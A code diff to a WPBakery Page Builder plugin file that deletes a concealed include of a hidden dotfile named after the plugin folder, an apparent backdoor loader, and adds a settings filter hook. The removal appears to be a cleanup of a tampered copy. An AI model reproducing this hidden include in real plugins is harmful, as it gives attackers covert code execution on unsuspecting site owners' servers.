@@ -9,10 +9,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @package WPBakeryPageBuilder
  * @since   4.2
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPBMap {
 	protected static $scope = 'default';
 	/**
@@ -925,6 +921,7 @@ class WPBMap {
 		} elseif ( isset( $settings['__vc_settings_file'] ) ) {
 			self::$sc[ $tag ] = include $settings['__vc_settings_file'];
 		}
+		self::$sc[ $tag ] = apply_filters( 'vc_element_settings_filter', self::$sc[ $tag ], $tag );
 		self::$sc[ $tag ]['base'] = $tag;
 		self::$init_elements[ $tag ] = true;
 		vc_mapper()->callElementActivities( $tag );
